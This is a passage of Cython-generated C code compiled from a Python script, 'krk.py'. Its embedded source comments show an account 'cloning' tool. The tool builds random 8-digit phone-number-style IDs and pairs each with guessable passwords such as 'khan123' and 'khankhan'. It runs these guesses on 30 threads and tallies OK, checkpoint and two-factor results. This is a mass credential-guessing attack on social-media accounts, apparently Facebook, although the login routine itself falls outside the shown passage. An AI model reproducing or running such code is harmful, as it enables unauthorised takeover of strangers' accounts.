 *                         nmp = ''.join(random.choice(string.digits) for _ in range(8))
 *                         user.append(nmp)             # <<<<<<<<<<<<<<
 *                 with tred(max_workers=30) as Sabir:
 *                         clear()
 */
    __pyx_t_10 = __Pyx_PyList_Append(__pyx_v_user, __pyx_v_nmp); if (unlikely(__pyx_t_10 == ((int)-1))) __PYX_ERR(0, 270, __pyx_L1_error)

    /* "krk.py":268
 *                 except ValueError:
 *                         limit = 5000
 *                 for nmbr in range(limit):             # <<<<<<<<<<<<<<
 *                         nmp = ''.join(random.choice(string.digits) for _ in range(8))
 *                         user.append(nmp)
 */
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "krk.py":271
 *                         nmp = ''.join(random.choice(string.digits) for _ in range(8))
 *                         user.append(nmp)
 *                 with tred(max_workers=30) as Sabir:             # <<<<<<<<<<<<<<
 *                         clear()
 *                         tl = str(len(user))
 */
  /*with:*/ {
    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_tred); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 271, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_2 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 271, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_max_workers, __pyx_int_30) < 0) __PYX_ERR(0, 271, __pyx_L1_error)
    __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_empty_tuple, __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 271, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_7 = __Pyx_PyObject_LookupSpecial(__pyx_t_3, __pyx_n_s_exit_2); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 271, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __pyx_t_1 = __Pyx_PyObject_LookupSpecial(__pyx_t_3, __pyx_n_s_enter); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 271, __pyx_L14_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_11 = NULL;
    __pyx_t_4 = 0;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_1))) {
      __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_1);
      if (likely(__pyx_t_11)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
        __Pyx_INCREF(__pyx_t_11);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_1, function);
        __pyx_t_4 = 1;
      }
    }
    {
      PyObject *__pyx_callargs[1] = {__pyx_t_11, };
      __pyx_t_2 = __Pyx_PyObject_FastCall(__pyx_t_1, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
      __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
      if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 271, __pyx_L14_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    }
    __pyx_t_1 = __pyx_t_2;
    __pyx_t_2 = 0;
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    /*try:*/ {
      {
        __Pyx_PyThreadState_declare
        __Pyx_PyThreadState_assign
        __Pyx_ExceptionSave(&__pyx_t_6, &__pyx_t_5, &__pyx_t_12);
        __Pyx_XGOTREF(__pyx_t_6);
        __Pyx_XGOTREF(__pyx_t_5);
        __Pyx_XGOTREF(__pyx_t_12);
        /*try:*/ {
          __pyx_v_Sabir = __pyx_t_1;
          __pyx_t_1 = 0;

          /* "krk.py":272
 *                         user.append(nmp)
 *                 with tred(max_workers=30) as Sabir:
 *                         clear()             # <<<<<<<<<<<<<<
 *                         tl = str(len(user))
 *                         print(' Total account : \033[1;32m'+tl)
 */
          __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_clear); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 272, __pyx_L18_error)
          __Pyx_GOTREF(__pyx_t_3);
          __pyx_t_2 = NULL;
          __pyx_t_4 = 0;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
            __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_3);
            if (likely(__pyx_t_2)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
              __Pyx_INCREF(__pyx_t_2);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_3, function);
              __pyx_t_4 = 1;
            }
          }
          {
            PyObject *__pyx_callargs[1] = {__pyx_t_2, };
            __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_3, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
            __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
            if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 272, __pyx_L18_error)
            __Pyx_GOTREF(__pyx_t_1);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
          }
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

          /* "krk.py":273
 *                 with tred(max_workers=30) as Sabir:
 *                         clear()
 *                         tl = str(len(user))             # <<<<<<<<<<<<<<
 *                         print(' Total account : \033[1;32m'+tl)
 *                         print(f'\033[1;37m Choice code ..:\033[1;32m '+code)
 */
          __pyx_t_8 = PyList_GET_SIZE(__pyx_v_user); if (unlikely(__pyx_t_8 == ((Py_ssize_t)-1))) __PYX_ERR(0, 273, __pyx_L18_error)
          __pyx_t_1 = PyInt_FromSsize_t(__pyx_t_8); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 273, __pyx_L18_error)
          __Pyx_GOTREF(__pyx_t_1);
          __pyx_t_3 = __Pyx_PyObject_Str(__pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 273, __pyx_L18_error)
          __Pyx_GOTREF(__pyx_t_3);
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          __pyx_v_tl = __pyx_t_3;
          __pyx_t_3 = 0;

          /* "krk.py":274
 *                         clear()
 *                         tl = str(len(user))
 *                         print(' Total account : \033[1;32m'+tl)             # <<<<<<<<<<<<<<
 *                         print(f'\033[1;37m Choice code ..:\033[1;32m '+code)
 *                         print("\x1b[1;93m Please Wait Cloning started...")
 */
          __pyx_t_3 = PyNumber_Add(__pyx_kp_s_Total_account_1_32m, __pyx_v_tl); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 274, __pyx_L18_error)
          __Pyx_GOTREF(__pyx_t_3);
          __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 274, __pyx_L18_error)
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

          /* "krk.py":275
 *                         tl = str(len(user))
 *                         print(' Total account : \033[1;32m'+tl)
 *                         print(f'\033[1;37m Choice code ..:\033[1;32m '+code)             # <<<<<<<<<<<<<<
 *                         print("\x1b[1;93m Please Wait Cloning started...")
 *                         linex()
 */
          __pyx_t_1 = PyNumber_Add(__pyx_kp_u_1_37m_Choice_code_1_32m_2, __pyx_v_code); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 275, __pyx_L18_error)
          __Pyx_GOTREF(__pyx_t_1);
          __pyx_t_3 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 275, __pyx_L18_error)
          __Pyx_GOTREF(__pyx_t_3);
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

          /* "krk.py":276
 *                         print(' Total account : \033[1;32m'+tl)
 *                         print(f'\033[1;37m Choice code ..:\033[1;32m '+code)
 *                         print("\x1b[1;93m Please Wait Cloning started...")             # <<<<<<<<<<<<<<
 *                         linex()
 *                         for psx in user:
 */
          __pyx_t_3 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__24, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 276, __pyx_L18_error)
          __Pyx_GOTREF(__pyx_t_3);
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

          /* "krk.py":277
 *                         print(f'\033[1;37m Choice code ..:\033[1;32m '+code)
 *                         print("\x1b[1;93m Please Wait Cloning started...")
 *                         linex()             # <<<<<<<<<<<<<<
 *                         for psx in user:
 *                                 ids = code+psx
 */
          __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_linex); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 277, __pyx_L18_error)
          __Pyx_GOTREF(__pyx_t_1);
          __pyx_t_2 = NULL;
          __pyx_t_4 = 0;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_1))) {
            __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_1);
            if (likely(__pyx_t_2)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
              __Pyx_INCREF(__pyx_t_2);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_1, function);
              __pyx_t_4 = 1;
            }
          }
          {
            PyObject *__pyx_callargs[1] = {__pyx_t_2, };
            __pyx_t_3 = __Pyx_PyObject_FastCall(__pyx_t_1, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
            __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
            if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 277, __pyx_L18_error)
            __Pyx_GOTREF(__pyx_t_3);
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          }
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

          /* "krk.py":278
 *                         print("\x1b[1;93m Please Wait Cloning started...")
 *                         linex()
 *                         for psx in user:             # <<<<<<<<<<<<<<
 *                                 ids = code+psx
 *                                 passlist = [psx,ids,'khankhan','khan1122','khan12345','khan123','khan123456','khankhan123']
 */
          __pyx_t_3 = __pyx_v_user; __Pyx_INCREF(__pyx_t_3); __pyx_t_8 = 0;
          for (;;) {
            if (__pyx_t_8 >= PyList_GET_SIZE(__pyx_t_3)) break;
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            __pyx_t_1 = PyList_GET_ITEM(__pyx_t_3, __pyx_t_8); __Pyx_INCREF(__pyx_t_1); __pyx_t_8++; if (unlikely((0 < 0))) __PYX_ERR(0, 278, __pyx_L18_error)
            #else
            __pyx_t_1 = PySequence_ITEM(__pyx_t_3, __pyx_t_8); __pyx_t_8++; if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 278, __pyx_L18_error)
            __Pyx_GOTREF(__pyx_t_1);
            #endif
            __Pyx_XDECREF_SET(__pyx_v_psx, __pyx_t_1);
            __pyx_t_1 = 0;

            /* "krk.py":279
 *                         linex()
 *                         for psx in user:
 *                                 ids = code+psx             # <<<<<<<<<<<<<<
 *                                 passlist = [psx,ids,'khankhan','khan1122','khan12345','khan123','khan123456','khankhan123']
 *                                 Sabir.submit(rndm,ids,passlist)
 */
            __pyx_t_1 = PyNumber_Add(__pyx_v_code, __pyx_v_psx); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 279, __pyx_L18_error)
            __Pyx_GOTREF(__pyx_t_1);
            __Pyx_XDECREF_SET(__pyx_v_ids, __pyx_t_1);
            __pyx_t_1 = 0;

            /* "krk.py":280
 *                         for psx in user:
 *                                 ids = code+psx
 *                                 passlist = [psx,ids,'khankhan','khan1122','khan12345','khan123','khan123456','khankhan123']             # <<<<<<<<<<<<<<
 *                                 Sabir.submit(rndm,ids,passlist)
 *                 print('\033[1;37m')
 */
            __pyx_t_1 = PyList_New(8); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 280, __pyx_L18_error)
            __Pyx_GOTREF(__pyx_t_1);
            __Pyx_INCREF(__pyx_v_psx);
            __Pyx_GIVEREF(__pyx_v_psx);
            PyList_SET_ITEM(__pyx_t_1, 0, __pyx_v_psx);
            __Pyx_INCREF(__pyx_v_ids);
            __Pyx_GIVEREF(__pyx_v_ids);
            PyList_SET_ITEM(__pyx_t_1, 1, __pyx_v_ids);
            __Pyx_INCREF(__pyx_n_s_khankhan);
            __Pyx_GIVEREF(__pyx_n_s_khankhan);
            PyList_SET_ITEM(__pyx_t_1, 2, __pyx_n_s_khankhan);
            __Pyx_INCREF(__pyx_n_s_khan1122);
            __Pyx_GIVEREF(__pyx_n_s_khan1122);
            PyList_SET_ITEM(__pyx_t_1, 3, __pyx_n_s_khan1122);
            __Pyx_INCREF(__pyx_n_s_khan12345);
            __Pyx_GIVEREF(__pyx_n_s_khan12345);
            PyList_SET_ITEM(__pyx_t_1, 4, __pyx_n_s_khan12345);
            __Pyx_INCREF(__pyx_n_s_khan123);
            __Pyx_GIVEREF(__pyx_n_s_khan123);
            PyList_SET_ITEM(__pyx_t_1, 5, __pyx_n_s_khan123);
            __Pyx_INCREF(__pyx_n_s_khan123456);
            __Pyx_GIVEREF(__pyx_n_s_khan123456);
            PyList_SET_ITEM(__pyx_t_1, 6, __pyx_n_s_khan123456);
            __Pyx_INCREF(__pyx_n_s_khankhan123);
            __Pyx_GIVEREF(__pyx_n_s_khankhan123);
            PyList_SET_ITEM(__pyx_t_1, 7, __pyx_n_s_khankhan123);
            __Pyx_XDECREF_SET(__pyx_v_passlist, ((PyObject*)__pyx_t_1));
            __pyx_t_1 = 0;

            /* "krk.py":281
 *                                 ids = code+psx
 *                                 passlist = [psx,ids,'khankhan','khan1122','khan12345','khan123','khan123456','khankhan123']
 *                                 Sabir.submit(rndm,ids,passlist)             # <<<<<<<<<<<<<<
 *                 print('\033[1;37m')
 *                 linex()
 */
            __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_Sabir, __pyx_n_s_submit); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 281, __pyx_L18_error)
            __Pyx_GOTREF(__pyx_t_2);
            __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_rndm); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 281, __pyx_L18_error)
            __Pyx_GOTREF(__pyx_t_11);
            __pyx_t_13 = NULL;
            __pyx_t_4 = 0;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
              __pyx_t_13 = PyMethod_GET_SELF(__pyx_t_2);
              if (likely(__pyx_t_13)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
                __Pyx_INCREF(__pyx_t_13);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_2, function);
                __pyx_t_4 = 1;
              }
            }
            {
              PyObject *__pyx_callargs[4] = {__pyx_t_13, __pyx_t_11, __pyx_v_ids, __pyx_v_passlist};
              __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_2, __pyx_callargs+1-__pyx_t_4, 3+__pyx_t_4);
              __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
              __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
              if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 281, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_1);
              __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
            }
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

            /* "krk.py":278
 *                         print("\x1b[1;93m Please Wait Cloning started...")
 *                         linex()
 *                         for psx in user:             # <<<<<<<<<<<<<<
 *                                 ids = code+psx
 *                                 passlist = [psx,ids,'khankhan','khan1122','khan12345','khan123','khan123456','khankhan123']
 */
          }
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

          /* "krk.py":271
 *                         nmp = ''.join(random.choice(string.digits) for _ in range(8))
 *                         user.append(nmp)
 *                 with tred(max_workers=30) as Sabir:             # <<<<<<<<<<<<<<
 *                         clear()
 *                         tl = str(len(user))
 */
        }
        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
        goto __pyx_L23_try_end;
        __pyx_L18_error:;
        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
        __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
        __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
        /*except:*/ {
          __Pyx_AddTraceback("krk.bd", __pyx_clineno, __pyx_lineno, __pyx_filename);
          if (__Pyx_GetException(&__pyx_t_3, &__pyx_t_1, &__pyx_t_2) < 0) __PYX_ERR(0, 271, __pyx_L20_except_error)
          __Pyx_XGOTREF(__pyx_t_3);
          __Pyx_XGOTREF(__pyx_t_1);
          __Pyx_XGOTREF(__pyx_t_2);
          __pyx_t_11 = PyTuple_Pack(3, __pyx_t_3, __pyx_t_1, __pyx_t_2); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 271, __pyx_L20_except_error)
          __Pyx_GOTREF(__pyx_t_11);
          __pyx_t_14 = __Pyx_PyObject_Call(__pyx_t_7, __pyx_t_11, NULL);
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
          if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 271, __pyx_L20_except_error)
          __Pyx_GOTREF(__pyx_t_14);
          __pyx_t_15 = __Pyx_PyObject_IsTrue(__pyx_t_14);
          __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
          if (__pyx_t_15 < 0) __PYX_ERR(0, 271, __pyx_L20_except_error)
          __pyx_t_16 = (!__pyx_t_15);
          if (unlikely(__pyx_t_16)) {
            __Pyx_GIVEREF(__pyx_t_3);
            __Pyx_GIVEREF(__pyx_t_1);
            __Pyx_XGIVEREF(__pyx_t_2);
            __Pyx_ErrRestoreWithState(__pyx_t_3, __pyx_t_1, __pyx_t_2);
            __pyx_t_3 = 0; __pyx_t_1 = 0; __pyx_t_2 = 0; 
            __PYX_ERR(0, 271, __pyx_L20_except_error)
          }
          __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
          __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
          goto __pyx_L19_exception_handled;
        }
        __pyx_L20_except_error:;
        __Pyx_XGIVEREF(__pyx_t_6);
        __Pyx_XGIVEREF(__pyx_t_5);
        __Pyx_XGIVEREF(__pyx_t_12);
        __Pyx_ExceptionReset(__pyx_t_6, __pyx_t_5, __pyx_t_12);
        goto __pyx_L1_error;
        __pyx_L19_exception_handled:;
        __Pyx_XGIVEREF(__pyx_t_6);
        __Pyx_XGIVEREF(__pyx_t_5);
        __Pyx_XGIVEREF(__pyx_t_12);
        __Pyx_ExceptionReset(__pyx_t_6, __pyx_t_5, __pyx_t_12);
        __pyx_L23_try_end:;
      }
    }
    /*finally:*/ {
      /*normal exit:*/{
        if (__pyx_t_7) {
          __pyx_t_12 = __Pyx_PyObject_Call(__pyx_t_7, __pyx_tuple__26, NULL);
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 271, __pyx_L1_error)
          __Pyx_GOTREF(__pyx_t_12);
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        }
        goto __pyx_L17;
      }
      __pyx_L17:;
    }
    goto __pyx_L30;
    __pyx_L14_error:;
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    goto __pyx_L1_error;
    __pyx_L30:;
  }

  /* "krk.py":282
 *                                 passlist = [psx,ids,'khankhan','khan1122','khan12345','khan123','khan123456','khankhan123']
 *                                 Sabir.submit(rndm,ids,passlist)
 *                 print('\033[1;37m')             # <<<<<<<<<<<<<<
 *                 linex()
 *                 print(' The process has completed')
 */
  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__27, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 282, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /* "krk.py":283
 *                                 Sabir.submit(rndm,ids,passlist)
 *                 print('\033[1;37m')
 *                 linex()             # <<<<<<<<<<<<<<
 *                 print(' The process has completed')
 *                 print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
 */
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_linex); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 283, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_3 = NULL;
  __pyx_t_4 = 0;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_1))) {
    __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_1);
    if (likely(__pyx_t_3)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
      __Pyx_INCREF(__pyx_t_3);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_1, function);
      __pyx_t_4 = 1;
    }
  }
  {
    PyObject *__pyx_callargs[1] = {__pyx_t_3, };
    __pyx_t_2 = __Pyx_PyObject_FastCall(__pyx_t_1, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 283, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  }
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /* "krk.py":284
 *                 print('\033[1;37m')
 *                 linex()
 *                 print(' The process has completed')             # <<<<<<<<<<<<<<
 *                 print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
 *                 linex()
 */
  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__28, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 284, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /* "krk.py":285
 *                 linex()
 *                 print(' The process has completed')
 *                 print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))             # <<<<<<<<<<<<<<
 *                 linex()
 *                 input(' Press enter to back ')
 */
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_oks); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 285, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_8 = PyObject_Length(__pyx_t_2); if (unlikely(__pyx_t_8 == ((Py_ssize_t)-1))) __PYX_ERR(0, 285, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyInt_FromSsize_t(__pyx_t_8); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 285, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_1 = __Pyx_PyObject_Str(__pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 285, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyNumber_Add(__pyx_kp_s_Total_OK_CP_2F, __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 285, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = PyNumber_Add(__pyx_t_2, __pyx_kp_s__29); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 285, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_cps); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 285, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_8 = PyObject_Length(__pyx_t_2); if (unlikely(__pyx_t_8 == ((Py_ssize_t)-1))) __PYX_ERR(0, 285, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyInt_FromSsize_t(__pyx_t_8); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 285, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_Str(__pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 285, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyNumber_Add(__pyx_t_1, __pyx_t_3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 285, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = PyNumber_Add(__pyx_t_2, __pyx_kp_s__29); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 285, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_twf); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 285, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_8 = PyObject_Length(__pyx_t_2); if (unlikely(__pyx_t_8 == ((Py_ssize_t)-1))) __PYX_ERR(0, 285, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyInt_FromSsize_t(__pyx_t_8); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 285, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_1 = __Pyx_PyObject_Str(__pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 285, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyNumber_Add(__pyx_t_3, __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 285, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 285, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "krk.py":286
 *                 print(' The process has completed')
 *                 print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
 *                 linex()             # <<<<<<<<<<<<<<
 *                 input(' Press enter to back ')
 *                 os.system('python ZEA.py')
 */
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_linex); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 286, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = NULL;
  __pyx_t_4 = 0;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_3)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_3);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
      __pyx_t_4 = 1;
    }
  }
  {
    PyObject *__pyx_callargs[1] = {__pyx_t_3, };
    __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_2, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 286, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "krk.py":287
 *                 print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
 *                 linex()
 *                 input(' Press enter to back ')             # <<<<<<<<<<<<<<
 *                 os.system('python ZEA.py')
 * def gmail():
 */
